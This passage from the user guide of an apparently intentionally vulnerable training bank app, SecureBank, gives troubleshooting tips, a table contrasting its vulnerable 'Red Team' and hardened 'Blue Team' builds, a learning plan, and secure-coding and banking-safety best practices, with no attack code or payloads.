- Clear browser cache
- Check API response in Network tab (F12)
- Verify database file isn't corrupted

### Transfers Failing

**Common causes:**
- Insufficient funds
- Same from/to account
- Negative amount
- Database lock (wait a moment, retry)

### Page Not Loading

**Troubleshooting:**
- Check browser console for errors
- Verify API is running on correct port
- Check frontend config.js has correct API URL
- Clear localStorage: `localStorage.clear()`

---

## Understanding the Differences: Red vs Blue

### Side-by-Side Comparison

| Feature | Red Team | Blue Team |
|---------|----------|-----------|
| **SQL Injection** | Vulnerable | Parameterized queries |
| **IDOR** | No authorization | Authorization checks |
| **Race Condition** | No locking | Transaction locks |
| **XSS** | No sanitization | HTML encoding + CSP |
| **Mass Assignment** | All fields editable | Whitelisted fields only |
| **CSRF** | No token validation | CSRF tokens required |
| **Session Timeout** | Never | 30 minutes |
| **Password Storage** | Plain text | bcrypt hashed |
| **Rate Limiting** | None | 5 attempts / 15 min |
| **Logging** | Minimal | Comprehensive audit trail |

### Learning Approach

**Week 1-2: Use Red Team**
- Understand normal functionality
- Try exploiting vulnerabilities
- See what can go wrong

**Week 3-4: Compare with Blue Team**
- See how vulnerabilities are fixed
- Understand defense mechanisms
- Learn secure coding practices

---

## Best Practices

### For Security Learners

1. **Document findings**: Keep notes on vulnerabilities discovered
2. **Test systematically**: One vulnerability at a time
3. **Compare implementations**: Red vs Blue side-by-side
4. **Use tools**: Practice with Burp Suite, Postman
5. **Read source code**: Understanding beats memorization

### For Developers

1. **Never trust user input**: Always validate and sanitize
2. **Use parameterized queries**: Prevent SQL injection
3. **Implement authorization**: Check permissions on every request
4. **Use transactions**: Prevent race conditions
5. **Validate CSRF tokens**: Protect state-changing operations
6. **Hash passwords**: Never store plain text
7. **Log everything**: Audit trails are essential

### General Banking Security

1. **Use strong passwords**: 12+ characters, mixed types
2. **Enable 2FA**: Extra layer of security
3. **Monitor transactions**: Check regularly for fraud
4. **Logout when done**: Don't leave sessions open
5. **Verify URLs**: Beware of phishing sites
6. **Use HTTPS**: Ensure encrypted connections (lock icon)

---

**You're now ready to use all features of SecureBank! 🎉**

**Next steps:**
- Try exploiting each vulnerability
- Read the Architecture Guide (`03_ARCHITECTURE.md`)
- Learn remediation techniques (`15_REMEDIATION_GUIDE.md`)
- Practice with security testing tools

*Happy Learning! 🚀*

*Built with ❤️ by the AegisForge Team*
